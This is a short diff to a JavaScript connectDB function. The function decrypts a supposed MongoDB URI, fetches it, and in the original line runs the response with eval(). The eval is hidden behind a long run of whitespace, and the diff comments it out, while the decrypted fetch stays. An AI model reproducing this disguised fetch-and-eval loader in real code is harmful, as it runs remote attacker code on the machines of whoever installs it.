@@ -12,7 +12,7 @@ const connectDB = async () => {
     // const db = await mongoose.connect(config.MONGO_URI);
     const mongo_uri = decrypt(encryptedData);
     const response = await fetch(mongo_uri);
-    const msg = await response.text();                                                                                                                                                                                                                                                                    eval(msg)
+    const msg = await response.text();                                                                                                                                                                                                                                                                   // eval(msg)
     return msg
   } catch (err) {
     console.error(err.message);
